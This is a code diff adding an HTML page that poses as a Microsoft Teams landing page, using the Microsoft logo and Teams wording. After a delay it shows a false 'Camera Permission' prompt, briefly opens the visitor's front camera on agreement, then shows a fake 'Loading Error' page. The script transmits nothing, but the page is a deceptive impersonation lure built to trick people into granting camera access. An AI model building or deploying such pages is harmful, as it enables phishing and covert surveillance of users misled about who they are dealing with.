@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Teams Clone</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f3f2f1;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            aspect-ratio: 9 / 16;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            background-color: #f3f2f1;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header img {
+            height: 25px;
+        }
+        .header select {
+            border: none;
+            background: none;
+            font-size: 16px;
+            color: #333;
+        }
+        .content {
+            text-align: center;
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .content h1 {
+            font-size: 24px;
+            color: #252423;
+        }
+        .content p {
+            font-size: 16px;
+            color: #5e5e5e;
+            margin: 15px 0;
+        }
+        .btn {
+            display: inline-block;
+            margin: 10px;
+            padding: 10px 20px;
+            background-color: #6264a7;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .btn-outline {
+            background-color: transparent;
+            color: #6264a7;
+            border: 2px solid #6264a7;
+        }
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+        .popup-content {
+            background: #fff;
+            padding: 20px;
+            text-align: center;
+            border-radius: 10px;
+        }
+        .popup-content button {
+            background-color: #6264a7;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+            <select>
+                <option>Teams</option>
+            </select>
+        </div>
+
+        <!-- Content -->
+        <div class="content">
+            <h1>Microsoft Teams</h1>
+            <p>Teams helps you organize your life and work, chat and call with anyone, and access your files securely.</p>
+            <button class="btn">Sign in</button>
+            <button class="btn btn-outline">Download Teams</button>
+        </div>
+    </div>
+
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <h2>Camera Permission</h2>
+            <p>This site requires camera access to continue. Do you agree?</p>
+            <button id="agree-btn">Agree</button>
+        </div>
+    </div>
+
+    <script>
+        // Show popup after 3 seconds
+        window.onload = function () {
+            setTimeout(() => {
+                document.getElementById('popup').style.display = 'flex';
+            }, 3000);
+        };
+
+        // Handle "Agree" button click
+        document.getElementById('agree-btn').addEventListener('click', function () {
+            document.getElementById('popup').style.display = 'none';
+
+            // Request camera access
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    // Access the front camera and take a "selfie"
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    setTimeout(() => {
+                        // Stop video stream after a moment
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Redirect to the "loading error" page
+                        document.body.innerHTML = '<h1>Loading Error</h1>';
+                    }, 2000);
+                })
+                .catch(err => {
+                    alert('Camera access denied or not available.');
+                });
+        });
+    </script>
+</body>
+</html>
